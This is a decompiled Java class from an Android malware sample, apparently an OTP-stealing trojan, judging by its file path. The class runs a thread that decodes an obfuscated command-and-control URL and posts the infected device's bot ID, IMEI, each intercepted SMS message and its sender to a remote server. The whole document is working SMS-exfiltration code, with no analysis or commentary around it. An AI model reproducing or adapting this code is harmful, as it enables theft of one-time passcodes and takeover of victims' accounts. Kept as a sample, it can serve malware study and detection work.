import android.content.Context;
import android.database.SQLException;
import com.soft360.iService.AService;
import java.io.InputStream;
import java.net.ConnectException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class ev
  extends Thread
{
  public String a;
  public String b;
  
  ev(eu parameu) {}
  
  public final void run()
  {
    super.run();
    for (;;)
    {
      try
      {
        if (this.jdField_a_of_type_Eu.jdField_a_of_type_AndroidContentContext != null)
        {
          Context localContext = this.jdField_a_of_type_Eu.jdField_a_of_type_AndroidContentContext;
          if (et.a(localContext).a()) {
            break label71;
          }
          throw new ConnectException("not online!");
        }
      }
      catch (Exception localException1)
      {
        new StringBuilder("webServiceRobot post sms ").append(localException1.toString()).toString();
        return;
      }
      Object localObject1 = AService.jdField_a_of_type_AndroidContentContext;
      continue;
      label71:
      localObject1 = dU.a(null);
      if (!((dU)localObject1).m()) {
        throw new SQLException("device not init!");
      }
      Object localObject2 = new DefaultHttpClient();
      ((HttpClient)localObject2).getParams().setParameter("http.protocol.content-charset", "UTF-8");
      Object localObject3 = this.jdField_a_of_type_Eu.jdField_a_of_type_AndroidContentContext.getString(2131165192);
      Object localObject4 = ((dU)localObject1).a;
      localObject3 = new String(cD.a((String)localObject3));
      localObject3 = new HttpPost(((dU)localObject1).a(AService.jdField_a_of_type_Int) + (String)localObject3);
      try
      {
        localObject4 = new ArrayList();
        ((List)localObject4).add(new BasicNameValuePair("bot_id", ((dU)localObject1).b()));
        ((List)localObject4).add(new BasicNameValuePair("imei", this.jdField_a_of_type_Eu.a()));
        ((List)localObject4).add(new BasicNameValuePair("sms", this.jdField_a_of_type_JavaLangString));
        ((List)localObject4).add(new BasicNameValuePair("from", this.b));
        ((HttpPost)localObject3).setEntity(new UrlEncodedFormEntity((List)localObject4, "UTF-8"));
        localObject1 = ((HttpClient)localObject2).execute((HttpUriRequest)localObject3);
        if (((HttpResponse)localObject1).getStatusLine().getStatusCode() != 200) {
          continue;
        }
        localObject1 = ((HttpResponse)localObject1).getEntity();
        if (localObject1 == null) {
          continue;
        }
        localObject1 = ((HttpEntity)localObject1).getContent();
        localObject2 = eu.a((InputStream)localObject1);
        new StringBuilder("webServiceRobot  Read from server ").append((String)localObject2).toString();
        ((InputStream)localObject1).close();
        return;
      }
      catch (Exception localException2)
      {
        localException2.toString();
        throw new Exception(localException2.toString());
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/ev.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */